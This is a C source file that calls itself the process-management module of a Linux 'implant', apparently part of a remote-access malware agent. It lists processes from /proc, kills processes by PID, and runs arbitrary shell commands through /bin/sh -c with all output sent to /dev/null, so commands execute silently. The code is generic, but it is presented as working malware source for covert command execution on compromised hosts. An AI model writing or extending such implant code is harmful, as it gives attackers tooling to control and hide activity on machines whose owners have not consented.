/**
 * process.c - Process management for Linux implant
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <dirent.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include "../../include/process.h"

extern char **environ;

int proc_ps(char *out, int max_out) {
    if (!out || max_out <= 0) return -1;

    int offset = snprintf(out, (size_t)max_out, "%-8s %-8s %s\n", "PID", "PPID", "NAME");
    offset += snprintf(out + offset, (size_t)max_out - (size_t)offset,
                       "%-8s %-8s %s\n", "---", "----", "----");

    DIR *d = opendir("/proc");
    if (!d) return -1;

    struct dirent *ent;
    while ((ent = readdir(d)) != NULL) {
        if (ent->d_name[0] < '1' || ent->d_name[0] > '9') continue;

        char statpath[128];
        snprintf(statpath, sizeof(statpath), "/proc/%s/stat", ent->d_name);

        FILE *sf = fopen(statpath, "r");
        if (!sf) continue;

        int pid = 0, ppid = 0;
        char comm[256] = {0};
        if (fscanf(sf, "%d %255s %*c %d", &pid, comm, &ppid) != 3) {
            fclose(sf);
            continue;
        }
        fclose(sf);

        if (comm[0] == '(') {
            char *end = strrchr(comm, ')');
            if (end && end[1] == '\0') {
                memmove(comm, comm + 1, (size_t)(end - comm - 1));
                comm[end - comm - 1] = '\0';
            }
        }

        int n = snprintf(out + offset, (size_t)max_out - (size_t)offset,
                         "%-8d %-8d %s\n", pid, ppid, comm);
        if (n > 0 && offset + n < max_out) offset += n;
        else break;
    }

    closedir(d);
    return 0;
}

int proc_kill(int pid) {
    if (pid <= 0) return -1;
    if (kill((pid_t)pid, SIGKILL) != 0) return -1;
    return 0;
}

int proc_spawn(const char *cmd) {
    if (!cmd || !*cmd) return -1;

    pid_t pid = fork();
    if (pid < 0) return -1;

    if (pid == 0) {
        int devnull = open("/dev/null", O_RDWR);
        if (devnull >= 0) {
            dup2(devnull, STDIN_FILENO);
            dup2(devnull, STDOUT_FILENO);
            dup2(devnull, STDERR_FILENO);
            if (devnull > STDERR_FILENO) close(devnull);
        }

        char *argv[] = { "/bin/sh", "-c", (char *)cmd, NULL };
        execve("/bin/sh", argv, environ);
        _exit(127);
    }

    return (int)pid;
}
